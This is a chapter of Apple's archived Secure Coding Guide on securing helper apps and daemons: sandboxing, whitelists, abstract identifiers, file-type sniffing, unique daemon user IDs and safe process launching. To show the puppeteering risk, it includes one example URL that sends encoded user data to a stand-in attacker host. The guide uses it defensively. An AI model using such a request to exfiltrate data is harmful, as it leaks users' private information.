---
title: "Designing Secure Helpers and Daemons"
book: "Secure Coding Guide"
chapterId: "TP40002415-CH2"
date: "2016-09-13"
description: "Describes techniques to use and factors to consider to make your code more secure from attack."
identifier: "//apple_ref/doc/uid/TP40002415"
source: apple-archive
---

# Designing Secure Helpers and Daemons

> **Secure Coding Guide**
> Last updated: 2016-09-13

[Next](../OtherHardeningTechniques/OtherHardeningTechniques.html)[Previous](../Articles/AppInterfaces.html)
        
        
        [](../index.html)
        
        # Designing Secure Helpers and Daemons
Privilege separation is a common technique for making applications more secure. By breaking up an application into functional units that each require fewer privileges, you can make it harder to do anything useful with any single part of that application if someone successfully compromises it.

However, without proper design, a privilege-separated app is not significantly more secure than a non-privilege-separated app. For proper security, each part of the app must treat other parts of the app as untrusted and potentially hostile. To that end, this chapter provides dos and don’ts for designing a helper app.

There are two different ways that you can perform privilege separation:

Creating a pure computation helper to isolate risky operations. This technique requires the main application to be inherently suspicious of any data that the helper returns, but does not require that the helper be suspicious of the application.

Creating a helper or daemon to perform tasks without granting the application the right to perform them. This requires not only that the main application not trust the helper, but also that the helper not trust the main application.

The techniques used for securing the two types of helpers differ only in the level of paranoia required by the helper.

## Use App Sandbox
At the core of privilege separation is the need to actually give the various components different levels of privilege. The recommended way to do this is through the use of App Sandbox. This technology allows you to restrict what your main app and its helper apps can do.

By default, when you enable App Sandbox on an app, that app has a basic level of system access that includes the ability to write files in a special per-app container directory, perform computation, and access certain basic system services. From that baseline, you add additional privileges by adding entitlements, such as the ability to read and write files chosen by the user through an open or save dialog, the ability to make outgoing network requests, the ability to listen for incoming network requests, and so on.

The process of sandboxing an app or its helpers is beyond the scope of this book. To learn more about choosing entitlements for your app and its helpers, read *[App Sandbox Design Guide](../../AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html#//apple_ref/doc/uid/TP40011183)*.

## Avoid Puppeteering
When a helper application is so tightly controlled by the main application that it does not make any decisions by itself, this is called **puppeteering**. This is inherently bad design because if the application gets compromised, the attacker can then control the helper similarly, in effect taking over pulling the helper’s “strings”. This completely destroys the privilege separation boundary. Therefore, unless you are creating a pure computation helper, splitting code into a helper application that simply does whatever the main app tells it to do is usually not a useful division of labor.

In general, a helper must be responsible for deciding whether or not to perform a particular action. If you look at the actions that an application can perform with and without privilege separation, those lists should be different; if they are not, then you are not gaining anything by separating the functionality out into a separate helper.

For example, consider a helper that downloads help content for a word processor. If the helper fetches any arbitrary URL that the word processor sends it, the helper can be trivially exploited to send arbitrary data to an arbitrary server. For example, an attacker who took control of the browser could tell the helper to access the URL `http://badguy.example.com/saveData?hereIsAnEncodedCopyOfTheUser%27sData`.

The subsections that follow describe solutions for this problem.

### Use Whitelists
One way to fix this is with whitelists. The helper should include a specific list of resources that it can access. For example, this helper could include:

A host whitelist that includes only the domain `example.org`. Requests to URLs in that domain would succeed, but the attacker could not cause the helper to access URLs in a different domain.

An allowed path prefix whitelist. The attacker would not be able to use cross-site scripting on the `example.org` bulletin board to redirect the request to another location. (This applies mainly to apps using a web UI.)

You can also avoid this by handling redirection manually.

An allowed file type whitelist. This could limit the helper to the expected types of files. (Note that file type whitelists are more interesting for helpers that access files on the local hard drive.)

A whitelist of specific URIs to which `GET` or `POST` operations are allowed.

### Use Abstract Identifiers and Structures
A second way to avoid puppeteering is by abstracting away the details of the request itself, using data structures and abstract identifiers instead of providing URIs, queries, and paths.

A trivial example of this is a help system. Instead of the app passing a fully-formed URI for a help search request, it might pass a flag field whose value tells the helper to “search by name” or “search by title” and a string value containing the search string. This flag field is an example of an abstract identifier; it tells the helper what to do without telling it how to do it.

Taken one step further, when the helper returns a list of search results, instead of returning the names and URIs for the result pages, it could return the names and an opaque identifier (which may be an index into the last set of search results). By doing so, the application cannot access arbitrary URIs because it never interacts with the actual URIs directly.

Similarly, if you have an application that works with project files that reference other files, in the absence of API to directly support this, you can use a temporary exception to give a helper access to all files on the disk. To make this more secure, the helper should provide access only to files that actually appear in the user-opened project. The helper might do this by requiring the application to request files by some arbitrary identifier generated by the helper rather than by name or path. This makes it harder for the application to ask the helper to open arbitrary files. This can further be augmented with sniffing, as described in [Use the Smell Test](#//apple_ref/doc/uid/TP40002415-CH2-SW6).

The same concept can be extended to other areas. For example, if the application needs to change a record in a database, the helper could send the record as a data structure, and the app could send back the altered data structure along with an indication of which values need to change. The helper could then verify the correctness of the unaltered data before modifying the remaining data.

Passing the data abstractly also allows the helper to limit the application’s access to other database tables. It also allows the helper to limit what kinds of queries the application can perform in ways that are more fine-grained than would be possible with the permissions system that most databases provide.

### Use the Smell Test
If a helper application has access to files that the main application cannot access directly, and if the main application asks the helper to retrieve the contents of that file, it is useful for the helper to perform tests on the file before sending the data to ensure that the main application has not substituted a symbolic link to a different file. In particular, it is useful to compare the file extension with the actual contents of the file to see whether the bytes on disk make sense for the apparent file type. This technique is called file type sniffing.

For example, the first few bytes of any image file usually provide enough information to determine the file type. If the first four bytes are `JFIF`, the file is probably a JPEG image file. If the first four bytes are `GIF8`, the file is probably a GIF image file. If the first four bytes are `MM.*` or `II*.`, the file is probably a TIFF file. And so on.

If the request passes this smell test, then the odds are good that the content is of the expected type.

## Treat Both App and Helper as Hostile
Because the entire purpose of privilege separation is to prevent an attacker from being able to do anything useful after compromising one part of an application, both the helper and the app must assume that the other party is potentially hostile. This means each piece must:

Avoid buffer overflows ([Avoiding Buffer Overflows and Underflows](../Articles/BufferOverflows.html#//apple_ref/doc/uid/TP40002577-SW1)).

Validate all input from the other side ([Validating Input and Interprocess Communication](../Articles/ValidatingInput.html#//apple_ref/doc/uid/TP40007246-SW3)).

Avoid insecure interprocess communication mechanisms ([Validating Input and Interprocess Communication](../Articles/ValidatingInput.html#//apple_ref/doc/uid/TP40007246-SW3))

Avoid race conditions ([Avoiding Race Conditions](../Articles/RaceConditions.html#//apple_ref/doc/uid/TP40002585-SW8)).

Treat the contents of any directory or file to which the other process has write access as fundamentally untrusted ([Securing File Operations](../Articles/RaceConditions.html#//apple_ref/doc/uid/TP40002585-SW9)). This list potentially includes:

The entire app container directory.

Preference files.

Temporary files.

User files.

And so on. If you follow these design principles, you will make it harder for an attacker to do anything useful if he or she compromises your app.

## Run Daemons as Unique Users
For daemons that start with elevated privileges and then drop privileges, you should always use a locally unique user ID for your program. If you use some standard UID such as `_unknown` or `nobody`, then any other process running with that same UID can interact with your program, either directly through interprocess communication, or indirectly by altering configuration files. Thus, if someone hijacks another daemon on the same server, they can then interfere with your daemon; or, conversely, if someone hijacks your daemon, they can use it to interfere with other daemons on the server.

You can use Open Directory services to obtain a locally unique UID. Note that UIDs from 0 through 500 are reserved for use by the system.

> **Note:** You should generally avoid making security decisions based on the user’s ID or name for two reasons:

Many APIs for determining the user ID and user name are inherently untrustworthy because they return the value of the `USER`.

Someone could trivially make a copy of your app and change the string to a different value, then run the app.

## Start Other Processes Safely
When it comes to security, not all APIs for running external tools are created equal. In particular:

**Avoid the POSIX **`[system](../../../../System/Conceptual/ManPages_iPhoneOS/man3/system.3.html#//apple_ref/doc/man/3/system)`** function.** Its simplicity makes it a tempting choice, but also makes it much more dangerous than other functions. When you use `system`, you become responsible for completely sanitizing the entire command, which means protecting any characters that are treated as special by the shell. You are responsible for understanding and correctly using the shell’s quoting rules, knowing which characters are interpreted within each type of quotation marks, and so on. This is no small feat even for expert shell script programmers, and is strongly inadvisable for everyone else. Bluntly put, you *will* get it wrong.

**Set up your own environment correctly ahead of time.** Many APIs search for the tool you want to run in locations specified by the `PATH` environment variable. If an attacker can modify that variable, the attacker can potentially trick your app into starting a different tool and running it as the current user.

You can avoid this problem by either explicitly setting the `PATH` environment variable yourself or by avoiding variants of `[exec](../../../../System/Conceptual/ManPages_iPhoneOS/man3/exec.3.html#//apple_ref/doc/man/3/exec)` or `[posix_spawn](../../../../System/Conceptual/ManPages_iPhoneOS/man2/posix_spawn.2.html#//apple_ref/doc/man/2/posix_spawn)` that use the `PATH` environment variable to search for executables.

**Use absolute paths where possible, or relative paths if absolute paths are not available.** By explicitly specifying a path to an executable rather than just its name, the `PATH` environment variable is not consulted when the OS determines which tool to run.

For more information about environment variables and shell special characters, read *[Shell Scripting Primer](../../../../OpenSource/Conceptual/ShellScripting/Introduction/Introduction.html#//apple_ref/doc/uid/TP40004268)*.

        
            [Next](../OtherHardeningTechniques/OtherHardeningTechniques.html)[Previous](../Articles/AppInterfaces.html)
        
         Copyright &#x00a9; 2016 Apple Inc. All Rights Reserved.  [Terms of Use](http://www.apple.com/legal/internet-services/terms/site.html)   |  [Privacy Policy](http://www.apple.com/privacy/)  |  Updated: 2016-09-13